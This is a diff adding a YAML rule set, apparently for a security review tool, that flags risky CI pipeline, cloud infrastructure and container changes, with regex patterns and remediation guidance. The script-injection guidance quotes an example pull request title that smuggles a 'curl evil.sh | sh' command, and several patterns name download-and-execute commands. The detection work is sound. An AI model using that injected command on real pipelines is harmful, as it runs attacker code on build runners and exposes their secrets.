@@ -1,0 +1,301 @@
+version: 1
+name: infra-ci
+description: >
+  Pipeline and infrastructure changes. CI configuration is the highest-value
+  target in most repositories: it holds deployment credentials and it runs code
+  from pull requests.
+
+rules:
+  - id: ci.pipeline-modified
+    title: CI/CD pipeline definition modified
+    category: tampering
+    severity: medium
+    confidence: high
+    on: file
+    paths:
+      - ".github/workflows/**"
+      - ".gitlab-ci.yml"
+      - "**/azure-pipelines*.yml"
+      - "Jenkinsfile*"
+      - ".circleci/config.yml"
+      - "**/buildkite*.yml"
+      - ".github/actions/**"
+      - "**/cloudbuild.yaml"
+    question: >
+      Does this pipeline have access to production credentials, and does the
+      change alter when or with whose code it runs?
+    guidance: |
+      Read the change as an attacker would: can I get my own code to execute in
+      this job? Look at trigger events, checkout refs, and any step that runs a
+      script from the pull request's own tree.
+      A pipeline change from an external contributor deserves the same scrutiny
+      as a change to authentication code.
+    cwe: ["CWE-1395"]
+
+  - id: ci.pull-request-target-with-head-checkout
+    title: Untrusted pull request code checked out in a privileged workflow
+    category: elevation-of-privilege
+    severity: critical
+    confidence: high
+    on: added
+    paths:
+      - ".github/workflows/**"
+    patterns:
+      - '(?i)pull_request_target|workflow_run'
+      - '(?i)ref\s*:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)'
+      - '(?i)ref\s*:\s*\$\{\{\s*github\.event\.workflow_run\.head'
+    question: >
+      Does this workflow both run with repository secrets and execute code from
+      the pull request branch?
+    guidance: |
+      `pull_request_target` and `workflow_run` run in the context of the base
+      repository, which means they have secrets and a writable token. Checking
+      out the head ref and then running anything from it - a build, a lint, a
+      `npm install` that triggers lifecycle scripts - hands those secrets to
+      anyone who can open a pull request.
+      If you need both, split it: an unprivileged workflow builds and uploads an
+      artifact, a privileged workflow consumes the artifact without executing it.
+    cwe: ["CWE-269"]
+    references:
+      - "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+
+  - id: ci.action-not-pinned-to-digest
+    title: Third-party action or image referenced by mutable tag
+    category: supply-chain
+    severity: medium
+    confidence: high
+    on: added
+    paths:
+      - ".github/workflows/**"
+      - ".github/actions/**"
+    patterns:
+      - '(?i)^\s*-?\s*uses\s*:\s*(?i)[a-z0-9][\w.\-]*/[\w.\-]+@(v?\d[\w.\-]*|main|master|latest|develop)\s*$'
+    exclude_patterns:
+      - '(?i)^\s*-?\s*uses\s*:\s*actions/'
+    question: >
+      If the owner of this action force-pushes the tag tomorrow, what runs in
+      your pipeline?
+    guidance: |
+      Git tags are mutable. Pin third-party actions to a full commit SHA and keep
+      the human-readable version in a trailing comment so Dependabot can still
+      update it:
+        uses: org/action@a1b2c3d4e5f6...  # v3.1.0
+      First-party `actions/*` are lower risk but the same reasoning applies for
+      a high-privilege workflow.
+    cwe: ["CWE-1357"]
+
+  - id: ci.secret-exposed-to-step
+    title: Secret piped into a shell step or printed
+    category: secrets
+    severity: high
+    confidence: medium
+    on: added
+    paths:
+      - ".github/workflows/**"
+      - ".gitlab-ci.yml"
+      - "Jenkinsfile*"
+      - ".circleci/config.yml"
+    patterns:
+      - '(?i)(echo|printf|cat)\s+[^\n]*\$\{?\{?\s*secrets\.'
+      - '(?i)run\s*:[^\n]*\$\{\{\s*(github\.event\.(issue|pull_request|comment)\.[a-z_.]*(title|body|head\.ref|login))'
+      - '(?i)(ACTIONS_STEP_DEBUG|--debug)[^\n]*true'
+      - '(?i)secrets\s*:\s*inherit'
+    question: >
+      Can the value of a secret reach a log, an artifact, or a string that gets
+      evaluated by the shell?
+    guidance: |
+      Two separate problems live here. First, secrets echoed into logs: GitHub
+      masks known secret values, but not derived values (base64, a substring, a
+      URL built from one).
+      Second, and worse: interpolating `${{ github.event.* }}` directly into a
+      `run:` block is script injection. A pull request title of
+      `"; curl evil.sh | sh; #` executes on your runner. Pass those values
+      through `env:` and reference them as shell variables instead.
+    cwe: ["CWE-532", "CWE-78"]
+
+  - id: ci.self-hosted-runner-introduced
+    title: Job moved to a self-hosted runner
+    category: elevation-of-privilege
+    severity: high
+    confidence: high
+    on: added
+    paths:
+      - ".github/workflows/**"
+    patterns:
+      - '(?i)runs-on\s*:\s*\[?\s*["'']?self-hosted'
+    question: >
+      Is this runner ephemeral, and can a fork's pull request schedule a job on
+      it?
+    guidance: |
+      A persistent self-hosted runner shares its filesystem, its caches and often
+      its cloud instance role with every job that lands on it. One malicious job
+      can leave a backdoor for the next one.
+      Use ephemeral runners, keep them out of public repositories, and never
+      allow `pull_request` from forks to target them.
+    cwe: ["CWE-269"]
+
+  - id: ci.remote-script-piped-to-shell
+    title: Remote script downloaded and executed
+    category: supply-chain
+    severity: high
+    confidence: high
+    on: added
+    patterns:
+      - '(?i)(curl|wget)[^\n|]*\|\s*(sudo\s+)?(ba)?sh'
+      - '(?i)(iwr|Invoke-WebRequest)[^\n]*\|\s*(iex|Invoke-Expression)'
+      - '(?i)(curl|wget)[^\n]*\s-o\s+[^\n]*&&\s*(chmod|\./)'
+    question: >
+      What is at the other end of that URL today, and what will be there during
+      your next deploy?
+    guidance: |
+      Curl-to-shell gives whoever controls that host, that domain and that TLS
+      chain the ability to run code in your build - retroactively, at any time.
+      Pin to a released artifact with a published checksum and verify it, or
+      vendor the installer into the repository where it can be reviewed and
+      diffed.
+    cwe: ["CWE-494"]
+
+  - id: iac.network-open-to-world
+    title: Network rule allows traffic from any address
+    category: elevation-of-privilege
+    severity: high
+    confidence: high
+    on: added
+    languages: [terraform, hcl, yaml, json, ci, compose, config]
+    patterns:
+      - '0\.0\.0\.0/0'
+      - '::/0'
+      - '(?i)source_?ranges?\s*[:=][^\n]*["'']?\*'
+    exclude_patterns:
+      - '(?i)(egress|outbound|route|0\.0\.0\.0/0"?\s*\]?\s*(#|//)\s*egress)'
+    question: >
+      Which port and protocol does this open, and is the service behind it
+      designed to face the internet?
+    guidance: |
+      An open rule on 443 in front of a load balancer is normal. The same rule on
+      22, 3389, 5432, 6379, 9200, 27017 or a management port is how databases end
+      up in breach reports.
+      Egress to 0.0.0.0/0 is usually intentional, but tightening it is one of the
+      few controls that actually slows down data exfiltration after a compromise.
+    cwe: ["CWE-284"]
+
+  - id: iac.iam-wildcard-policy
+    title: IAM policy grants wildcard actions or resources
+    category: elevation-of-privilege
+    severity: high
+    confidence: medium
+    on: added
+    languages: [terraform, hcl, json, yaml]
+    patterns:
+      - '(?i)"?(Action|actions)"?\s*[:=]\s*\[?\s*["'']\*["'']'
+      - '(?i)"?(Resource|resources)"?\s*[:=]\s*\[?\s*["'']\*["'']'
+      - '(?i)"?Principal"?\s*:\s*\{?\s*"?(AWS)?"?\s*:?\s*["'']\*["'']'
+      - '(?i)(roles/owner|roles/editor|Contributor|Owner)\b'
+      - '(?i)(iam:PassRole|sts:AssumeRole)[^\n]*\*'
+    question: >
+      Which specific actions does this principal need, and what does the wildcard
+      additionally grant?
+    guidance: |
+      `Action: "*"` on a role that any workload can assume is effectively account
+      takeover. `iam:PassRole` with a wildcard resource is privilege escalation
+      even when everything else looks restricted, because it lets the principal
+      hand a more powerful role to a service it can launch.
+      A `Principal: "*"` on a resource policy makes the resource public - check
+      whether a `Condition` block constrains it, and whether that condition is
+      one an outsider can satisfy.
+    cwe: ["CWE-269"]
+
+  - id: iac.storage-made-public
+    title: Storage bucket or object made publicly accessible
+    category: information-disclosure
+    severity: critical
+    confidence: high
+    on: added
+    languages: [terraform, hcl, json, yaml]
+    patterns:
+      - '(?i)(acl|canned_?acl)\s*[:=]\s*["''](public-read|public-read-write|authenticated-read)["'']'
+      - '(?i)block_public_(acls|policy|access)\s*[:=]\s*false'
+      - '(?i)ignore_public_acls\s*[:=]\s*false'
+      - '(?i)restrict_public_buckets\s*[:=]\s*false'
+      - '(?i)allUsers|allAuthenticatedUsers'
+      - '(?i)public_?(network_?)?access(_enabled)?\s*[:=]\s*(true|"Enabled")'
+    question: >
+      What is in this bucket now, and what will someone put in it in six months?
+    guidance: |
+      Public buckets are usually created for a legitimate reason - static assets,
+      a public dataset - and then become the default place to put things. Prefer
+      a separate bucket for public content, with the private one keeping
+      block-public-access on at the account level.
+      `allAuthenticatedUsers` in GCP and `AuthenticatedUsers` in S3 mean any
+      account on the entire platform, not any account in your organisation.
+    cwe: ["CWE-732"]
+
+  - id: iac.encryption-or-logging-disabled
+    title: Encryption, backup or audit logging disabled on a resource
+    category: information-disclosure
+    severity: high
+    confidence: medium
+    on: added
+    languages: [terraform, hcl, json, yaml]
+    patterns:
+      - '(?i)(encrypted|encryption|storage_encrypted|enable_key_rotation|kms_?key)\w*\s*[:=]\s*(false|null|"")'
+      - '(?i)(logging|audit_?logs?|access_?logs?|flow_?logs?|cloudtrail|monitoring)\w*\s*[:=]\s*(false|"Disabled"|null)'
+      - '(?i)(backup_retention_period|retention_in_days|retention_days)\s*[:=]\s*0\b'
+      - '(?i)(skip_final_snapshot|deletion_protection)\s*[:=]\s*(true|false)'
+      - '(?i)publicly_accessible\s*[:=]\s*true'
+    question: >
+      Is this resource holding regulated or customer data, and what does the
+      control being switched off protect against?
+    guidance: |
+      Encryption at rest mostly protects against media disposal and snapshot
+      sharing; audit logging protects your ability to answer "what happened"
+      after an incident, which is a legal obligation in many jurisdictions.
+      Retention set to zero on an audit log is worth flagging even in a
+      non-production account, because the setting tends to be copied forward.
+    cwe: ["CWE-311", "CWE-778"]
+
+  - id: container.privileged-or-host-namespace
+    title: Container granted host privileges
+    category: elevation-of-privilege
+    severity: critical
+    confidence: high
+    on: added
+    languages: [yaml, compose, json, terraform, hcl, dockerfile]
+    patterns:
+      - '(?i)privileged\s*[:=]\s*true'
+      - '(?i)(hostNetwork|hostPID|hostIPC|host_network|network_mode)\s*[:=]\s*(true|["'']host["''])'
+      - '(?i)allowPrivilegeEscalation\s*:\s*true'
+      - '(?i)(capabilities|cap_add)[^\n]*\b(SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE)\b'
+      - '(?i)hostPath\s*:'
+      - '(?i)/var/run/docker\.sock'
+    question: >
+      Which specific capability is needed, and is a container escape from this
+      workload equivalent to node compromise?
+    guidance: |
+      `privileged: true` and a mounted Docker socket are both full node takeover
+      for anyone who gets code execution in the container. Replace with the
+      narrowest capability that works, drop everything else, and keep the
+      workload off nodes that run other tenants.
+      A `hostPath` mount of `/` or `/etc` is the same problem wearing a different
+      hat.
+    cwe: ["CWE-250"]
+
+  - id: container.runs-as-root
+    title: Container image runs as root
+    category: elevation-of-privilege
+    severity: medium
+    confidence: medium
+    on: any
+    languages: [dockerfile, yaml, compose]
+    patterns:
+      - '(?i)^\s*USER\s+(root|0)\s*$'
+      - '(?i)runAsUser\s*:\s*0\b'
+      - '(?i)runAsNonRoot\s*:\s*false'
+    question: >
+      Does anything in this image need UID 0 at runtime, or only at build time?
+    guidance: |
+      Build steps often need root; the runtime almost never does. Install as
+      root, then drop to a non-root `USER` as the final instruction. Combine with
+      a read-only root filesystem and `allowPrivilegeEscalation: false` for a
+      meaningful reduction in what a code-execution bug gets you.
+    cwe: ["CWE-250"]
